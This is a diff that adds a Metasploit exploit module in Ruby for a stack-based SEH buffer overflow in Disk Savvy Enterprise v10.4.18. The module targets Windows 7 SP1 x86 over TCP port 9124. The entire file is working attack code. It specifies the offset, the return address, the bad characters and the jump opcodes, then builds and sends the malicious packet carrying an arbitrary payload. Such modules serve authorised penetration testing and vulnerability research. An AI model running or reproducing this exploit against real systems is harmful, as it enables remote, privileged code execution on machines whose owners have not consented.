@@ -1,0 +1,77 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::Seh
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Disk Savvy Enterprise v10.4.18',
+      'Description'    => %q{
+        This module exploits a stack-based buffer overflow vulnerability
+        in Disk Savvy Enterprise v10.4.18, caused by improper bounds
+        checking of the request sent to the built-in server. This module
+        has been tested successfully on Windows 7 SP1 x86.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Daniel Teixeira'
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Platform'       => 'win',
+      'Payload'        =>
+        {
+          'BadChars'   => "\x00\x02\x0a\x0d\xf8",
+          'Space'      => 800
+        },
+      'Targets'        =>
+        [
+          [ 'Disk Savvy Enterprise v10.4.18',
+            {
+              'Offset' => 124,
+              'Ret'    => 0x10056d13
+            }
+          ]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Jan 31 2017',
+      'DefaultTarget'  => 0))
+
+    register_options([Opt::RPORT(9124)])
+
+  end
+
+  def exploit
+    seh = generate_seh_record(target.ret)
+    connect
+
+    buffer = make_nops(target['Offset'])
+    buffer << seh
+    buffer << "\x83\xc4\x7f" * 13   #ADD esp,7fh
+    buffer << "\x83\xc4\x21"        #ADD esp,21h
+    buffer << "\xff\xe4"            #JMP esp
+    buffer << payload.encoded
+    buffer << Rex::Text.rand_text_alphanumeric(1)
+
+    header = "\x75\x19\xba\xab"
+    header << "\x03\x00\x00\x00"
+    header << "\x00\x40\x00\x00"
+    header << [buffer.length].pack("V")
+    header << [buffer.length].pack("V")
+    header << [buffer[-1].ord].pack("V")
+    packet = header
+    packet << buffer
+
+    sock.put(packet)
+    handler
+  end
+end
